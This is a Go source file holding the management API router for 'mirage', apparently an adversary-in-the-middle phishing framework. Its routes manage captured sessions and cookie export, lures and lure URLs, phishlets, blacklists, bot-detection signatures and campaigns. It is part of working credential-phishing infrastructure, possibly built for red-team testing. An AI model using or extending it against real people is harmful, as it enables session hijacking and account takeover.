package api

import (
	"encoding/json"
	"errors"
	"net/http"
	"strconv"
	"time"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/store"
)

// --- Local interfaces ---
// Each interface is defined here at the point of use, containing only the
// methods the Router actually needs. This keeps the api package decoupled
// from concrete service and store types.

type sessionManager interface {
	Get(id string) (*aitm.Session, error)
	List(filter aitm.SessionFilter) ([]*aitm.Session, error)
	Delete(id string) error
	ExportCookiesJSON(id string) ([]byte, error)
}

type lureManager interface {
	Get(id string) (*aitm.Lure, error)
	Create(lure *aitm.Lure) error
	Update(lure *aitm.Lure) error
	Delete(id string) error
	List() ([]*aitm.Lure, error)
	Pause(id string, d time.Duration) error
	Unpause(id string) error
}

type phishletManager interface {
	GetPhishletConfig(name string) (*aitm.PhishletConfig, error)
	SetPhishletConfig(cfg *aitm.PhishletConfig) error
	ListPhishletConfigs() ([]*aitm.PhishletConfig, error)
	CreateSubPhishlet(sp *aitm.SubPhishlet) error
	DeleteSubPhishlet(name string) error
}

type blacklistManager interface {
	Block(ip string)
	Unblock(ip string)
	List() []string
}

type botguardManager interface {
	List() []aitm.BotSignature
	Add(sig aitm.BotSignature)
	Remove(ja4Hash string) bool
	Save() error
}

type eventBus interface {
	Subscribe(eventType aitm.EventType) <-chan aitm.Event
	Unsubscribe(eventType aitm.EventType, ch <-chan aitm.Event)
}

// --- Router ---

// RouterDeps holds the dependencies required to construct a Router.
type RouterDeps struct {
	Sessions  sessionManager
	Lures     lureManager
	Phishlets phishletManager
	Blacklist blacklistManager
	Botguard  botguardManager
	Bus       eventBus
	Domain    string // global base domain for lure URL generation
	Version   string
}

// Router is the top-level handler for the management API. It implements
// http.Handler and is passed to the APIRouter pipeline step.
type Router struct {
	mux       *http.ServeMux
	sessions  sessionManager
	lures     lureManager
	phishlets phishletManager
	blacklist blacklistManager
	botguard  botguardManager
	bus       eventBus
	domain    string
	version   string
	startedAt time.Time
}

// NewRouter wires all dependencies into the ServeMux and returns a ready Router.
func NewRouter(deps RouterDeps) *Router {
	r := &Router{
		mux:       http.NewServeMux(),
		sessions:  deps.Sessions,
		lures:     deps.Lures,
		phishlets: deps.Phishlets,
		blacklist: deps.Blacklist,
		botguard:  deps.Botguard,
		bus:       deps.Bus,
		domain:    deps.Domain,
		version:   deps.Version,
		startedAt: time.Now(),
	}
	r.registerRoutes()
	return r
}

func (r *Router) ServeHTTP(w http.ResponseWriter, req *http.Request) {
	r.mux.ServeHTTP(w, req)
}

func (r *Router) registerRoutes() {
	auth := r.authMiddleware

	// Sessions
	r.mux.HandleFunc("GET /api/sessions/stream", auth(r.streamSessions))
	r.mux.HandleFunc("GET /api/sessions/{id}/export", auth(r.exportSessionCookies))
	r.mux.HandleFunc("GET /api/sessions/{id}", auth(r.getSession))
	r.mux.HandleFunc("DELETE /api/sessions/{id}", auth(r.deleteSession))
	r.mux.HandleFunc("GET /api/sessions", auth(r.listSessions))

	// Lures
	r.mux.HandleFunc("GET /api/lures", auth(r.listLures))
	r.mux.HandleFunc("POST /api/lures", auth(r.createLure))
	r.mux.HandleFunc("PATCH /api/lures/{id}", auth(r.updateLure))
	r.mux.HandleFunc("DELETE /api/lures/{id}", auth(r.deleteLure))
	r.mux.HandleFunc("POST /api/lures/{id}/url", auth(r.generateLureURL))
	r.mux.HandleFunc("POST /api/lures/{id}/pause", auth(r.pauseLure))
	r.mux.HandleFunc("DELETE /api/lures/{id}/pause", auth(r.unpauseLure))

	// Phishlets
	r.mux.HandleFunc("GET /api/phishlets/registry", auth(r.listRegistry))
	r.mux.HandleFunc("GET /api/phishlets/{name}/hosts", auth(r.getPhishletHosts))
	r.mux.HandleFunc("POST /api/phishlets/{name}/enable", auth(r.enablePhishlet))
	r.mux.HandleFunc("POST /api/phishlets/{name}/disable", auth(r.disablePhishlet))
	r.mux.HandleFunc("POST /api/phishlets/{name}/hide", auth(r.hidePhishlet))
	r.mux.HandleFunc("POST /api/phishlets/{name}/unhide", auth(r.unhidePhishlet))
	r.mux.HandleFunc("DELETE /api/phishlets/{name}", auth(r.deleteSubPhishlet))
	r.mux.HandleFunc("GET /api/phishlets", auth(r.listPhishlets))
	r.mux.HandleFunc("POST /api/phishlets", auth(r.createSubPhishlet))

	// Blacklist
	r.mux.HandleFunc("GET /api/blacklist", auth(r.listBlacklist))
	r.mux.HandleFunc("POST /api/blacklist", auth(r.addBlacklistEntry))
	r.mux.HandleFunc("DELETE /api/blacklist/{entry}", auth(r.removeBlacklistEntry))

	// DNS
	r.mux.HandleFunc("GET /api/dns/zones", auth(r.listDNSZones))
	r.mux.HandleFunc("POST /api/dns/sync", auth(r.syncDNS))

	// BotGuard
	r.mux.HandleFunc("GET /api/botguard/signatures", auth(r.listBotSignatures))
	r.mux.HandleFunc("POST /api/botguard/signatures", auth(r.addBotSignature))
	r.mux.HandleFunc("DELETE /api/botguard/signatures/{hash}", auth(r.removeBotSignature))
	r.mux.HandleFunc("PATCH /api/botguard/threshold", auth(r.updateBotThreshold))

	// System
	r.mux.HandleFunc("GET /api/status", auth(r.getStatus))
	r.mux.HandleFunc("POST /api/reload", auth(r.reload))

	// Campaigns
	r.mux.HandleFunc("GET /api/campaigns", auth(r.listCampaignMappings))
	r.mux.HandleFunc("POST /api/campaigns/sync", auth(r.syncCampaign))
}

// --- Helpers ---

func writeJSON(w http.ResponseWriter, status int, v any) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(v)
}

func writeError(w http.ResponseWriter, status int, message, code string) {
	writeJSON(w, status, ErrorResponse{Error: message, Code: code})
}

func parsePagination(req *http.Request) (limit, offset int) {
	limit = 50
	if v := req.URL.Query().Get("limit"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n > 0 {
			limit = n
		}
	}
	if limit > 500 {
		limit = 500
	}
	if v := req.URL.Query().Get("offset"); v != "" {
		if n, err := strconv.Atoi(v); err == nil && n >= 0 {
			offset = n
		}
	}
	return
}

// errStatus maps store sentinel errors to HTTP status codes and API error codes.
func errStatus(err error) (int, string) {
	if errors.Is(err, store.ErrNotFound) {
		return http.StatusNotFound, "NOT_FOUND"
	}
	if errors.Is(err, store.ErrConflict) {
		return http.StatusConflict, "CONFLICT"
	}
	return http.StatusInternalServerError, "INTERNAL_ERROR"
}
